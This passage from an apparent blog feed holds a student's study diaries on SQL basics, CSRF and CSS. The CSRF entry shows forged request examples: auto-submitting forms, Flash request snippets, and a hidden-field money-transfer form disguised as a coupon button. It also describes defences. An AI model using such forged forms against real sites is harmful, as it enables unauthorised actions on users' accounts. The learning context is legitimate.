tablename;</strong><br>新增数据表</p><p><del>…写到这里发现不想写下去，因为语句太多太多了，基本上就是按照上面说的sql结构进一步操作。（这让我想起来phpmyadmin的可视化数据表好方便）</del></p><h1 id="基本SQL注入"><a href="#基本SQL注入" class="headerlink" title="基本SQL注入"></a>基本SQL注入</h1><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p><h3 id="进入到系统自带的information-schema"><a href="#进入到系统自带的information-schema" class="headerlink" title="进入到系统自带的information_schema"></a>进入到系统自带的information_schema</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use information_schema;</span><br></pre></td></tr></table></figure><h3 id="显示数据表"><a href="#显示数据表" class="headerlink" title="显示数据表"></a>显示数据表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure><h3 id="显示数据表-1"><a href="#显示数据表-1" class="headerlink" title="显示数据表"></a>显示数据表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables;</span><br></pre></td></tr></table></figure><p>最后就会出现如图结果。<br><a href="https://imgchr.com/i/ru0Vns"><img src="https://s3.ax1x.com/2020/12/14/ru0Vns.png" alt="ru0Vns.png"></a></p><h2 id="SQL的发现"><a href="#SQL的发现" class="headerlink" title="SQL的发现"></a>SQL的发现</h2><h3 id="SQL注入的产生–从代码层次理解"><a href="#SQL注入的产生–从代码层次理解" class="headerlink" title="SQL注入的产生–从代码层次理解"></a>SQL注入的产生–从代码层次理解</h3><p><a href="https://imgchr.com/i/ruDYY6"><img src="https://s3.ax1x.com/2020/12/14/ruDYY6.png" alt="ruDYY6.png"></a></p><p>总的来说：web没有对用户输入的数据进行严格的过滤，就把sql带进数据库进行查询。</p><h3 id="SQL注入的发现"><a href="#SQL注入的发现" class="headerlink" title="SQL注入的发现"></a>SQL注入的发现</h3><p><em>找到有可能用到sql查询语句的地方</em><br><em>寻找所有有可能出现SQL交互的</em></p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>学习了基本的sql结构，下一步可以是sql注入的实践，期望更有收获。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;终于来到sql注入的学习了，sql注入先是给我了很“黑客”的感觉，之前有操作过phpmyadmin，接触了数据库普通的“查删减改”（大多数都是在后端云干的），那sql语句长什么样子呢，sql注入又是如何。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="SQL注入" scheme="http://favorhau.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>20201209学习日记---Csrf</title>
    <link href="http://favorhau.github.io/2020/12/09/20201209%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://favorhau.github.io/2020/12/09/20201209%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-12-09T11:28:26.000Z</published>
    <updated>2020-12-09T10:09:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>早几年了解过HTTP请求，今天从CTF的角度上去看了一下请求中存在的漏洞。</p><span id="more"></span><h1 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h1><p>HTTP其实很多学问，包括请求头（header），代理（agent）等等，在这里先再了解一下几个常用的HTTP请求。最常用的应该是get和post了，而除此之外还有put delete 等等。<br>表单提交中get和post方式的区别有5点</p><ol><li>get是从服务器上获取数据，post是向服务器传送数据。</li><li>get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。post是通过HTTPpost机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。</li><li>对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。</li><li>get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。（这里有看到其他文章介绍get和post的传送数据大小跟各个浏览器、操作系统以及服务器的限制有关）</li><li>get安全性非常低，post安全性较高。<br>根据以往的经验来看，大多数api的请求都要求使用post方式。而一般流量一般的网页则用get方式。而put和delete很少用，且很多都能够用post代替。</li></ol><h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><p><em>钓鱼网站，界面操作和真是的页面一模一样，当用户操作转账功能的时候，转账数据也会发送到真实的后台，但是其中用户输入的信息中对端账户可能会被修改掉，导致用户确实转账了，但是钱却转给了别人</em></p><p>以下内容摘自<a href="https://wiki.x10sec.org/web/csrf-zh/#html-csrf">ctfwiki</a>：</p><h2 id="CSRF-类型"><a href="#CSRF-类型" class="headerlink" title="CSRF 类型"></a>CSRF 类型</h2><p>按请求类型，可分为 GET 型和 POST 型。</p><p>按攻击方式，可分为 HTML CSRF、JSON HiJacking、Flash CSRF 等。</p><h3 id="HTML-CSRF"><a href="#HTML-CSRF" class="headerlink" title="HTML CSRF"></a>HTML CSRF</h3><p>利用 HTML 元素发出 CSRF 请求，这是最常见的 CSRF 攻击。</p><p>HTML 中能设置 <code>src/href</code> 等链接地址的标签都可以发起一个 GET 请求，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&quot;&quot;&gt;</span><br><span class="line">&lt;img src=&quot;&quot;&gt;</span><br><span class="line">&lt;img lowsrc=&quot;&quot;&gt;</span><br><span class="line">&lt;img dynsrc=&quot;&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;&quot;&gt;</span><br><span class="line">&lt;frame src=&quot;&quot;&gt;</span><br><span class="line">&lt;script src=&quot;&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;bgsound src=&quot;&quot;&gt;&lt;/bgsound&gt;</span><br><span class="line">&lt;embed src=&quot;&quot;&gt;&lt;/bgsound&gt;</span><br><span class="line">&lt;video src=&quot;&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;audio src=&quot;&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;&lt;/a&gt;</span><br><span class="line">&lt;table background=&quot;&quot;&gt;&lt;/table&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>还有 CSS 样式中的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="attribute">background</span>:url(<span class="string">&quot;&quot;</span>)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>也可使用表单来对 POST 型的请求进行伪造。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://www.a.com/register&quot; id=&quot;register&quot; method=&quot;post&quot;&gt;</span><br><span class="line">  &lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</span><br><span class="line">  &lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var f = document.getElementById(&quot;register&quot;);</span><br><span class="line">  f.inputs[0].value = &quot;test&quot;;</span><br><span class="line">  f.inputs[1].value = &quot;passwd&quot;;</span><br><span class="line">  f.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="Flash-CSRF"><a href="#Flash-CSRF" class="headerlink" title="Flash CSRF"></a>Flash CSRF</h3><p>Flash 也有各种方式可以发起网络请求，包括 POST。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import flash<span class="selector-class">.net</span><span class="selector-class">.URLRequest</span>;</span><br><span class="line">import flash<span class="selector-class">.system</span><span class="selector-class">.Security</span>;</span><br><span class="line"><span class="selector-tag">var</span> url = new URLRequest(&quot;http://target/page<span class="string">&quot;);</span></span><br><span class="line"><span class="string">var param = new URLVariables();</span></span><br><span class="line"><span class="string">param = &quot;</span>test=<span class="number">123</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">url.method = &quot;</span>POST<span class="string">&quot;;</span></span><br><span class="line"><span class="string">url.data = param;</span></span><br><span class="line"><span class="string">sendToURL(url);</span></span><br><span class="line"><span class="string">stop();</span></span><br></pre></td></tr></table></figure><p>Flash 中还可以使用 <code>getURL</code>、<code>loadVars</code> 等方式发起请求。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">req = new LoadVars();</span><br><span class="line">req<span class="selector-class">.addRequestHeader</span>(&quot;foo&quot;, &quot;bar&quot;);</span><br><span class="line">req<span class="selector-class">.send</span>(&quot;http://target/page?v1=<span class="number">123</span>&amp;v2=<span class="number">222</span><span class="string">&quot;, &quot;</span>_blank<span class="string">&quot;, &quot;</span>GET<span class="string">&quot;);</span></span><br></pre></td></tr></table></figure><h2 id="CSRF实例"><a href="#CSRF实例" class="headerlink" title="CSRF实例"></a>CSRF实例</h2><p>直接通过引文中的内容来实例化，进行CSRF攻击需要有两样东西</p><ul><li>cookie</li><li>仿造表单<h3 id="用户正常登录"><a href="#用户正常登录" class="headerlink" title="用户正常登录"></a>用户正常登录</h3></li></ul><ol><li>用户在正常访问目标网站的时候登录账户，产生相应的cookie，成功变成登录状态。</li><li>用户在不知情的情况下进入受到篡改的网页。</li></ol><h3 id="跨站请求伪造"><a href="#跨站请求伪造" class="headerlink" title="跨站请求伪造"></a>跨站请求伪造</h3><p>这时候需要伪造一个网页，表单值账户填写自己的账户即可，示例代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to_account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;9999&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击领取优惠卷&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>示例图：<br><a href="#"><img src="https://s3.ax1x.com/2020/12/09/rCRf54.png" alt="rCRf54.png"></a></p><h3 id="模拟表单向目标服务器发送请求"><a href="#模拟表单向目标服务器发送请求" class="headerlink" title="模拟表单向目标服务器发送请求"></a>模拟表单向目标服务器发送请求</h3><p>通过模拟表单 向已经登录的网站发送请求 即可完成csrf攻击。</p><h2 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h2><p>常见的csrf防御其实经常可以见到。</p><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码强制用户必须与应用进行交互，才能完成最终请求。<br>所以这样为什么那么多网站需要设置验证码，当然验证码的作用还不知这些，比方说还有防爬等作用。</p><h3 id="验证Referer"><a href="#验证Referer" class="headerlink" title="验证Referer"></a>验证Referer</h3><p>检查请求是否来自合法的源。但服务器并非什么时候都能取得 Referer</p><h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>CSRF 能够攻击成功的本质原因是重要操作的所有参数都可以被攻击者猜测得到。<br>token验证（应该也是最常用的验证方式），在许多api的开发文档当中都会涉及到验证token的环节。<br><em>Token must be random enough. In addition, the purpose of Token is not to prevent duplicate submissions, so for the convenience of use, it is allowed to use the same Token in the lifetime of a user before the Token is consumed, but if the user has already submitted the form, the Token has Consumed, the token should be regenerated.<br>Token should also pay attention to its confidentiality. If the Token appears in the URL, it may be leaked through the Referer. Try to put the Token in the form, change the sensitive operation from GET to POST, submit it as a form or AJAX, avoid Token. Give way.</em></p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>这样的攻击（我甚至觉得这不应该称为攻击）常常出现在我们周边，当然真正的攻击远不止那么简单，需要用到多方面的漏洞，当然对于攻击的防御现在运用到哈希散列等等的知识。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;早几年了解过HTTP请求，今天从CTF的角度上去看了一下请求中存在的漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>20201207学习日记</title>
    <link href="http://favorhau.github.io/2020/12/07/20201207%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://favorhau.github.io/2020/12/07/20201207%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-12-07T11:28:26.000Z</published>
    <updated>2021-09-06T01:26:59.783Z</updated>
    
    <content type="html"><![CDATA[<p>想学习“世界上最好的语言” PHP，想从前端三大件入门。前些时间看了一些html基础，今日看了一下CSS。希望能快点进入JavaScript的学习。</p><span id="more"></span><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>由于未深入到具体项目层次，仅于W3C中简要习得一些基本的标记，<del>勿喷</del>。</p><h4 id="CSS基础语法"><a href="#CSS基础语法" class="headerlink" title="CSS基础语法"></a>CSS基础语法</h4><h5 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selector &#123;declaration1; declaration2; ... declarationN &#125;</span><br></pre></td></tr></table></figure><p>选择器通常是您需要改变样式的 HTML 元素。<br>每条声明由一个属性和一个值组成。<br>属性（property）是您希望设置的样式属性（style attribute）。每个属性有一个值。属性和值被冒号分开。这也很像html里面的“value：key”方式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selector &#123;property: value&#125;</span><br></pre></td></tr></table></figure><p>下面这行代码的作用是将 h1 元素内的文字颜色定义为红色，同时将字体大小设置为 14 像素。<br>在这个例子中，h1 是选择器，color 和 font-size 是属性，red 和 14px 是值。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span> &#123;<span class="attribute">color</span>:red; <span class="attribute">font-size</span>:<span class="number">14px</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.w3school.com.cn/i/ct_css_selector.gif" alt="CSS 语法"></p><h5 id="选择器的分组"><a href="#选择器的分组" class="headerlink" title="选择器的分组"></a>选择器的分组</h5><p>可以对选择器进行分组，这样，被分组的选择器就可以分享相同的声明。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: green;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><del>（在模板里面经常见到这种用法（或者使用bootstrap等的时候））</del><br>其中有关继承的问题，比方说子元素继承父元素的属性。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">       <span class="selector-class">.generate</span>&#123;</span></span><br><span class="line"><span class="css">          <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="css">       &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;generate&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        this is a paragraph</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样的话&lt;p&gt;就会显示为红色。</p><h5 id="派生选择器"><a href="#派生选择器" class="headerlink" title="派生选择器"></a>派生选择器</h5><p>我希望列表中的 strong 元素变为斜体字，而不是通常的粗体字，可以这样定义一个派生选择器：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">li</span> <span class="selector-tag">strong</span> &#123;</span><br><span class="line">    <span class="attribute">font-style</span>: italic;</span><br><span class="line">    <span class="attribute">font-weight</span>: normal;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">p</span>&gt;&lt;<span class="selector-tag">strong</span>&gt;我是粗体字，不是斜体字，因为我不在列表当中，所以这个规则对我不起作用&lt;/<span class="selector-tag">strong</span>&gt;&lt;/<span class="selector-tag">p</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">ol</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">li</span>&gt;&lt;<span class="selector-tag">strong</span>&gt;我是斜体字。这是因为 <span class="selector-tag">strong</span> 元素位于 <span class="selector-tag">li</span> 元素内。&lt;/<span class="selector-tag">strong</span>&gt;&lt;/<span class="selector-tag">li</span>&gt;&lt;/<span class="attribute">font</span>&gt; </span><br><span class="line">&lt;<span class="selector-tag">li</span>&gt;我是正常的字体。</span><br><span class="line">&lt;/<span class="selector-tag">ol</span>&gt;</span><br></pre></td></tr></table></figure><p>在上面的例子中，只有 li 元素中的 strong 元素的样式为斜体字，无需为 strong 元素定义特别的 class 或 id，代码更加简洁。</p><h5 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h5><p>下面的两个 id 选择器，第一个可以定义元素的颜色为红色，第二个定义元素的颜色为绿色：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#red</span> &#123;<span class="attribute">color</span>:red;&#125;</span><br><span class="line"><span class="selector-id">#green</span> &#123;<span class="attribute">color</span>:green;&#125;</span><br></pre></td></tr></table></figure><p>下面的 HTML 代码中，id 属性为 red 的 p 元素显示为红色，而 id 属性为 green 的 p 元素显示为绿色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">p</span> id=&quot;red&quot;&gt;这个段落是红色。&lt;/<span class="selector-tag">p</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">p</span> id=&quot;green&quot;&gt;这个段落是绿色。&lt;/<span class="selector-tag">p</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>在现代布局中，id 选择器常常用于建立派生选择器。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#sidebar</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line"><span class="attribute">font-style</span>: italic;</span><br><span class="line"><span class="attribute">text-align</span>: right;</span><br><span class="line"><span class="attribute">margin-top</span>: <span class="number">0.5em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的样式只会应用于出现在 id 是 sidebar 的元素内的段落。</p><h5 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h5><p>终于到最重要的部分了，可能也是最主要需要用到的部分。</p><p><strong>在 CSS 中，类选择器以一个点号显示：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.center</span> &#123;<span class="attribute">text-align</span>: center&#125;</span><br></pre></td></tr></table></figure><p>在上面的例子中，所有拥有 center 类的 HTML 元素均为居中。</p><p>在下面的 HTML 代码中，h1 和 p 元素都有 center 类。这意味着两者都将遵守 “.center” 选择器中的规则。(摘自w3c)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">This heading will be center-aligned</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">This paragraph will also be center-aligned.</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>和 id 一样，class 也可被用作派生选择器：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.fancy</span> <span class="selector-tag">td</span> &#123;</span><br><span class="line"><span class="attribute">color</span>: <span class="number">#f60</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#666</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="CSS创建"><a href="#CSS创建" class="headerlink" title="CSS创建"></a>CSS创建</h4><p>大多数css早已分文件编写（外部样式表）。如果用于调整一个地方，使用内链样式表未尝不是一个做法吧。<del>（我经常这样）</del></p><h5 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h5><p>可以用&lt;link&gt;标签链接外部样式表。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h5><p>当单个文档需要特殊的样式时，就应该使用内部样式表。可以使用&lt;style&gt; 标签在文档头部定义内部样式表，就像这样:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">  hr &#123;<span class="attribute">color</span>: sienna;&#125;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>: <span class="number">20px</span>;&#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h5><p>style也可以作为标签的一个属性，不过需要慎用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: sienna; margin-left: 20px&quot;</span>&gt;</span></span><br><span class="line">This is a paragraph</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="多重样式"><a href="#多重样式" class="headerlink" title="多重样式"></a>多重样式</h5><p>三种声明方式可以一起用，比方说可以单独修改某个样式，优先级为内联&gt;内部&gt;外联样式表。</p><h4 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h4><p>之前试过客户端和后端云交换数据，没试过html和js的交互。浅尝了前面的Hyper Text Markup Language以及CSS后（当然如今的html5和CSS3提供了许多新的features，还有许多的plugins等着我去发掘），很期待之后JS的学习，体验这样的一门脚本语言。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;想学习“世界上最好的语言” PHP，想从前端三大件入门。前些时间看了一些html基础，今日看了一下CSS。希望能快点进入JavaScript的学习。&lt;/p&gt;</summary>
    
    
    
    <category term="码农日常" scheme="http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"/>
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>20201205学习日记</title>
    <link href="http://favorhau.github.io/2020/12/05/20201205%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://favorhau.github.io/2020/12/05/20201205%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-12-05T10:09:01.000Z</published>
    <updated>2020-12-05T10:10:00.000Z</updated>
    
